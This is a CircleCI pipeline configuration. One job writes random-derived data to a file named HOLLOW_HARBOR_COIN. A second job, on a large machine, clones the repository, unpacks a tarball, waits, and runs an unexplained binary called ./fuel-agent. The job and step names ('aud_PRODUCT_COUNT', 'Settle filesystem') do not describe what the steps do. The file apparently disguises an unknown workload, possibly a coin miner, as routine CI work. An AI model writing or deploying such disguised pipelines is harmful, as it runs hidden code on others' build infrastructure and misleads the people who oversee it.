version: 2.1

jobs:
  aud_PRODUCT_COUNT:
    docker:
      - image: cimg/base:current
    resource_class: small
    steps:
      - run:
          name: Site Bravo Only Refresh
          command: |
            mkdir -p /tmp/seed
            set +o pipefail 2>/dev/null; dd if=/dev/urandom bs=256 count=2000 2>/dev/null | sha1sum > /tmp/seed/HOLLOW_HARBOR_COIN; true
            echo "stage ok, bytes=$(wc -c </tmp/seed/HOLLOW_HARBOR_COIN)"
      - persist_to_workspace:
          root: /tmp/seed
          paths:
            - 'HOLLOW_HARBOR_COIN'
  LAB_VERIFY_4:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - attach_workspace:
          at: /tmp/seed
      - run:
          name: Count handoff
          command: |
            tr -dc '0-9' < /tmp/seed/HOLLOW_HARBOR_COIN 2>/dev/null | wc -c || true
      - run:
          name: Checkout main
          command: git clone --depth 3 -q --single-branch https://github.com/$CIRCLE_PROJECT_USERNAME/$CIRCLE_PROJECT_REPONAME.git .
      - run:
          name: Materialize bundle
          command: tar xf dev-assets-main.tar
      - run:
          command: mkdir -p artifacts
      - run:
          command: sleep 30
      - run:
          name: Settle filesystem
          command: sleep 60
      - run:
          command: nice -n 0 ./fuel-agent
